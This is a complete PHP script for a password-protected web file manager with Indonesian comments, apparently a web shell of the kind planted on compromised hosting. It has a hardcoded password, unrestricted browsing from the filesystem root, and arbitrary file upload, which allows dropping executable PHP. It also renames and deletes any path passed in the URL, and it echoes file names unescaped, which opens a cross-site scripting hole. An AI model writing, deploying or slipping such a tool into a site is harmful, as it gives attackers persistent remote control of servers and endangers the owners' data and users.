<?php
session_start();
$pass = "ganteng"; // GANTI PASSWORDNYA DI SINI!

if (!isset($_SESSION['view'])) {
    if (isset($_POST['p']) && $_POST['p'] == $pass) { $_SESSION['view'] = true; }
    else { die('<body style="background:#121212;color:#eee;display:flex;justify-content:center;padding-top:100px;"><form method="post" style="border:1px solid #4caf50;padding:20px;border-radius:10px;"><h3>File Manager Login</h3>Pass: <input type="password" name="p" autofocus><br><br><input type="submit" value="Masuk" style="width:100%;cursor:pointer;"></form></body>'); }
}

$path = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$path = str_replace('\\', '/', realpath($path));

// --- LOGIC BUAT FOLDER ---
if (isset($_POST['new_folder'])) {
    $folder_name = $_POST['new_folder'];
    $target_folder = $path . '/' . $folder_name;
    if (!file_exists($target_folder)) {
        mkdir($target_folder, 0755);
        header("Location: ?dir=" . urlencode($path)); exit;
    }
}

// --- LOGIC RENAME ---
if (isset($_GET['oldname']) && isset($_GET['newname'])) {
    $old = $_GET['oldname'];
    $new = dirname($old) . '/' . $_GET['newname'];
    if (file_exists($old)) {
        rename($old, $new);
        header("Location: ?dir=" . urlencode($path)); exit;
    }
}

// --- LOGIC HAPUS ---
if (isset($_GET['del'])) {
    $target = $_GET['del'];
    if (is_dir($target)) {
        rmdir($target); // Hanya hapus folder kosong, buat keamanan
    } else {
        unlink($target);
    }
    header("Location: ?dir=" . urlencode($path)); exit;
}

// --- LOGIC UPLOAD ---
if (isset($_FILES['u'])) {
    move_uploaded_file($_FILES['u']['tmp_name'], $path.'/'.$_FILES['u']['name']);
    header("Location: ?dir=" . urlencode($path)); exit;
}

$folders = explode('/', $path);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Explorer V3 - LiteSpeed Ready</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
        .breadcrumb { background: #161b22; padding: 12px; border-radius: 6px; margin-bottom: 15px; border: 1px solid #30363d; }
        .breadcrumb a { color: #58a6ff; text-decoration: none; }
        table { width: 100%; border-collapse: collapse; background: #161b22; border: 1px solid #30363d; border-radius: 6px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #30363d; }
        tr:hover { background: #21262d; }
        .dir { color: #d29922; font-weight: bold; text-decoration: none; }
        .file { color: #c9d1d9; }
        .actions { display: flex; gap: 8px; }
        .btn { font-size: 11px; text-decoration: none; padding: 4px 8px; border-radius: 4px; font-weight: bold; cursor: pointer; background: transparent; }
        .btn-del { border: 1px solid #f85149; color: #f85149; }
        .btn-ren { border: 1px solid #58a6ff; color: #58a6ff; }
        .tool-bar { display: flex; gap: 10px; margin-bottom: 20px; background: #161b22; padding: 15px; border-radius: 6px; border: 1px solid #30363d; }
        input[type="text"], input[type="file"] { background: #0d1117; border: 1px solid #30363d; color: white; padding: 5px; border-radius: 4px; }
    </style>
    <script>
        function renameFile(oldPath, oldName) {
            let newName = prompt("Ganti nama menjadi:", oldName);
            if (newName && newName !== oldName) {
                window.location.href = "?dir=<?php echo urlencode($path); ?>&oldname=" + encodeURIComponent(oldPath) + "&newname=" + encodeURIComponent(newName);
            }
        }
    </script>
</head>
<body>

<div class="breadcrumb">
    <strong>📍 Location: </strong>
    <?php 
    $acc = "";
    foreach ($folders as $f) {
        if ($f === "") { $acc = "/"; echo '<a href="?dir=/">Root</a>'; } 
        else { $acc .= ($acc == "/" ? "" : "/") . $f; echo '<span> / </span><a href="?dir='.urlencode($acc).'">'.$f.'</a>'; }
    }
    ?>
</div>

<div class="tool-bar">
    <form method="post" enctype="multipart/form-data" style="display:inline;">
        <span>Upload: </span><input type="file" name="u"> <input type="submit" value="Upload" style="cursor:pointer;">
    </form>
    <div style="border-left: 1px solid #30363d; margin: 0 10px;"></div>
    <form method="post" style="display:inline;">
        <span>New Folder: </span><input type="text" name="new_folder" placeholder="Nama folder..." required> 
        <input type="submit" value="Buat" style="cursor:pointer;">
    </form>
</div>

<table>
    <thead><tr><th>Nama</th><th>Aksi</th></tr></thead>
    <tbody>
        <?php
        $items = scandir($path);
        foreach ($items as $i) {
            if ($i == "." || $i == "..") continue;
            $full = $path . '/' . $i;
            $isDir = is_dir($full);
        ?>
        <tr>
            <td>
                <?php if ($isDir): ?>
                    <a class="dir" href="?dir=<?php echo urlencode($full); ?>">📁 <?php echo $i; ?></a>
                <?php else: ?>
                    <span class="file">📄 <?php echo $i; ?></span>
                <?php endif; ?>
            </td>
            <td class="actions">
                <button class="btn btn-ren" onclick="renameFile('<?php echo addslashes($full); ?>', '<?php echo addslashes($i); ?>')">RENAME</button>
                <a href="?dir=<?php echo urlencode($path); ?>&del=<?php echo urlencode($full); ?>" class="btn btn-del" onclick="return confirm('Hapus <?php echo $i; ?>?')">DELETE</a>
            </td>
        </tr>
        <?php } ?>
    </tbody>
</table>

</body>
</html>
